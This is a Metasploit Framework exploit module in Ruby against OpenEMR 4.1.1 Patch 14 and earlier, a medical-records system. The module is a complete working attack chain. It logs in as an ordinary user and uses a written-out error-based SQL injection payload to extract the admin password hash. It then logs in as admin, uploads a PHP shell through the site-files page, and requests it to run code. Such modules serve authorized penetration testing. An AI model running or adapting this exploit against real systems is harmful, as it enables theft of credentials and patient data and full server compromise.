##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "OpenEMR 4.1.1 Patch 14 SQLi Privilege Escalation Remote Code Execution",
      'Description'    => %q{
        This module exploits a vulnerability found in OpenEMR version 4.1.1 Patch 14 and lower.
        When logging in as any non-admin user it's possible to retrieve the admin SHA1 password
        hash from the database through SQL injection. The SQL injection vulnerability exists
        in the "new_comprehensive_save.php" page.
        This hash can be used to log in as the admin user. After logging in, the
        "manage_site_files.php" page will be used to upload arbitrary code.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'xistence <xistence[at]0x90.nl>' # Discovery, Metasploit module
        ],
      'References'     =>
        [
        ],
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          ['OpenEMR', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Sep 16 2013",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The base path to the OpenEMR installation', '/openemr']),
          OptString.new('USER', [true, 'The non-admin user', '']),
          OptString.new('PASS', [true, 'The non-admin password', ''])
        ], self.class)
  end

  def check
    uri = target_uri.path
    peer = "#{rhost}:#{rport}"

    # Check version
    print_status("#{peer} - Trying to detect installed version")

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, "interface", "login", "login.php")
    })

    if res and res.code == 200 and res.body =~ /v(\d+.\d+.\d+)/
      version = $1
    else
      return Exploit::CheckCode::Unknown
    end

    print_status("#{peer} - Version #{version} detected")

    if version < "4.1.2"
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit

    uri = target_uri.path

    peer = "#{rhost}:#{rport}"

    # Password should be converted to a SHA1 hash
    password = Rex::Text.sha1("#{datastore['PASS']}")

    post_data = "authProvider=Default&authUser=#{datastore['USER']}&authPass=#{password}"
    print_status("#{peer} - Logging in as non-admin user [ #{datastore['USER']} ]")
    res = send_request_cgi({
            'method' => 'POST',
            'uri'    => normalize_uri(uri, "interface", "main", "main_screen.php?auth=login&site=default"),
            'data'   => post_data
    })

    if res.code == 200
      if (res.headers['Set-Cookie'] =~ /OpenEMR=([a-zA-Z0-9]+)/)
            session = $1
            print_status("#{peer} - Login sucessful")
            print_status("#{peer} - Session cookie is [ #{session} ]")
        else
          print_error("#{peer} - Session cookie not found!")
        end
    else
      print_error("#{peer} - Login was not successful!")
    end

    # Our SQL Error-Based Injection string - The string will return the admin password hash between the words ABCD<hash>ABCD in the response page.
    sqli = "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x41424344,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,50) "
    sqli << "FROM users WHERE username = 0x61646d696e LIMIT 0,1),0x41424344,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'pwned'='pwned"

    post_data = "form_pubpid=#{sqli}"
    print_status("#{peer} - Retrieving admin password hash through SQLi")
    res = send_request_cgi({
      'method' => 'POST',
      'data' => post_data,
      'cookie' => "OpenEMR=#{session}",
      'uri'    => normalize_uri(uri, "interface", "new", "new_comprehensive_save.php")
    })

    if res.code == 200
      if (res.body =~ /ABCD([a-zA-Z0-9]+)ABCD/)
        adminhash = $1
        print_status("#{peer} - Admin password hash is [ #{adminhash} ]")
      else
        print_error("#{peer} - Admin password hash not found!")
      end
    else
      print_error("#{peer} - Server returned #{res.code.to_s}")
    end


    post_data = "authProvider=Default&authUser=admin&authPass=#{adminhash}"
      print_status("#{peer} - Logging in as admin user using retrieved password hash")
      res = send_request_cgi({
        'method' => 'POST',
        'uri'    => normalize_uri(uri, "interface", "main", "main_screen.php?auth=login&site=default"),
        'data'   => post_data
      })

    if res.code == 200
      if (res.headers['Set-Cookie'] =~ /OpenEMR=([a-zA-Z0-9]+)/)
        session = $1
        print_status("#{peer} - Login sucessful")
        print_status("#{peer} - Session cookie is [ #{session} ]")
      else
          print_error("#{peer} - Session cookie not found!")
      end
    else
      print_error("#{peer} - Login was not successful!")
    end

    # Random filename
    payload_name = rand_text_alpha(rand(10) + 5) + '.php'

    post_data = "--o0oOo0o\r\n"
    post_data << "Content-Disposition: form-data; name=\"bn_save\"\r\n\r\n"
    post_data << "Save\r\n"
    post_data << "--o0oOo0o\r\n"
    post_data << "Content-Disposition: file; name=\"form_image\"; filename=\"#{payload_name}\"\r\n\r\n"
    post_data << "<?php "
    post_data << payload.encoded
    post_data << " ?>\r\n"
    post_data << "--o0oOo0o\r\n"

    print_status("#{peer} - Uploading shell [ #{payload_name} ]")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(uri, "interface", "super", "manage_site_files.php"),
      'ctype'  => 'multipart/form-data; boundary=o0oOo0o',
      'cookie' => "OpenEMR=#{session}",
      'data'   => post_data
    })

    # If the server returns 200 and the body contains our payload name,
    # we assume we uploaded the malicious file successfully
    if not res or res.code != 200
      print_error("#{peer} - File wasn't uploaded, aborting!")
      return
    end

    print_status("#{peer} - Requesting shell [ #{uri}/sites/default/images/#{payload_name} ]")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, "sites", "default", "images", "#{payload_name}")
    })

    # If we don't get a 200 when we request our malicious payload, we suspect
    # we don't have a shell, either.  Print the status code for debugging purposes.
    if res and res.code != 200
      print_error("#{peer} - Server returned #{res.code.to_s}")
    end

  end

end
